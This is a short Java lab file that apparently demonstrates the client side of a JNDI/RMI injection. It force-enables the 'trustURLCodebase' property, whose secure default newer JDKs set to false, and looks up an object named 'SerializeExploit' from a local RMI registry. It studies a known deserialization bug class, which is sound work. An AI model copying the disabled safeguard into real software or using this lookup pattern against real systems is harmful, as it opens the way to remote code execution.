package com.customized.libs.core.libs.fastjson.bug.rmi;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

/**
 * @author yan
 */
public class RMIClient {

    /*
     * The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.
     * 与JDK版本有关系，高版本的JDK针对此项默认配置位false，无法利用JNDI进行类加载
     */
    static {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
    }

    public static void main(String[] args) throws NamingException {
        case01();
        case02();
    }

    private static void case01() throws NamingException {
        InitialContext var1 = new InitialContext();
        var1.lookup("rmi://127.0.0.1:1099/SerializeExploit");
    }

    private static void case02() throws NamingException {
        //设置系统静态属性，指定上下文环境的FACTORY为rmi，从而替换掉默认的URL来指向我自定义的地址。
        //也可以通过创建一个HashTable来指定下面这两个键值，然后传给InitialContext
        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        //指定rmi远程地址
        System.setProperty(Context.PROVIDER_URL, "rmi://127.0.0.1:1099");
        //初始化JDNI服务入口
        Context ctx = new InitialContext();
        //通过名字检索远程对象
        Object obj = ctx.lookup("SerializeExploit");
        System.out.println(obj);
    }
}
